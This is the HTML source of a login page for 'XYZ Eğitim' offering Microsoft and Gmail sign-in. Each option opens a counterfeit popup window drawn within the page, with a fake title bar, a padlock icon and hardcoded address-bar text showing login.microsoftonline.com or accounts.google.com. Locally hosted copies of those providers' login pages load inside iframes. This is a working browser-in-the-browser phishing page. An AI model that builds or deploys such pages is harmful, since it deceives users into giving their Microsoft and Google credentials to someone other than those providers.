<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="./assets/css/style.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
	<div class="login-container">
        <h1>XYZ Eğitim</h1>
        <form action="#">
            <input type="text" id="username" placeholder="Kullanıcı Adı" required>
            <input type="password" id="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
        <div class="social-login">
            <button id="microsoft-login"> <img src="./assets/img/favicon.ico" alt="" sizes="25px"> Microsoft ile Giriş Yap</button>
            <button id="gmail-login"><img src="./assets/img/mail-logo.png" alt="" > Gmail ile Giriş Yap</button>
        </div>
    </div>	

<!-- Microsoft Login -->
<div class="window" id="microsoft">
<div class="title-bar-width" id="m-title">
	<div id="title-bar">
		<div style="margin-top:5px;">
			<img src="./assets/img/logo.svg" width="20px" height="15px" id="logo">
			<span id="logo-description">Microsoft</span>
		</div>

		<div>
			<span id="minimize">&#8212;</span>
			<span id="square">□</span>
			<span id="exit">✕</span>
		</div>
	</div>
	<div id="url-bar">
		<img src="./assets/img/ssl.svg" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name">https://login.microsoftonline.com</span>
		<span id="domain-path">/common/oauth2/v2.0/authorize</span>
	</div>
</div>
<div class="title-bar-width" id="g-title">
	<div id="deneme">
		<div style="margin-top:5px;">
			<img src="./Google Login Page/Google__G__logo.svg.png" width="20px" height="15px" id="logo">
			<span id="logo-description">Google</span>
		</div>

		<div>
			<span id="minimizes">&#8212;</span>
			<span id="squares">□</span>
			<span id="exits">✕</span>
		</div>
	</div>
	<div id="url-bar">
		<img src="./assets/img/ssl.svg" width="20px" height="20px" id="ssl-padlock">
		<span id="domain-name">https://accounts.google.com</span>
		<span id="domain-path">/v3/signin/identifier</span>
	</div>
</div>
<!-- Content start -->
<iframe id="Microsoft" class="content" src="./Microsoft Login page/index.html" frameBorder="0" sandbox="allow-same-origin allow-scripts allow-popups allow-forms"></iframe>
<iframe id="Gmail" class="content" src="./Google Login Page/index.html" frameBorder="0" sandbox="allow-same-origin allow-scripts allow-popups allow-forms"></iframe>

	</div>
</body>
<script src="script.js"></script>

</html>
